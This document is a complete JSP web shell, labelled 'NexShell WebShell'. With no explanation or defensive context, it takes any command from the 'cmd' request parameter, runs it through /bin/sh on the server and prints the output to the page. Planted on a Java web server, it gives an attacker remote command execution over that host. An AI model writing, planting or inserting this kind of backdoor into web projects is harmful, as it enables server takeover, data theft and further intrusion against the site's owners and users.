<%@ page import="java.util.*,java.io.*" %>
<!-- NexShell WebShell — JSP -->
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    String[] cmds = new String[]{"/bin/sh","-c",cmd};
    Process p = Runtime.getRuntime().exec(cmds);
    InputStream in = p.getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){out.println(new String(b));}  
    out.print("</pre>");
}
%>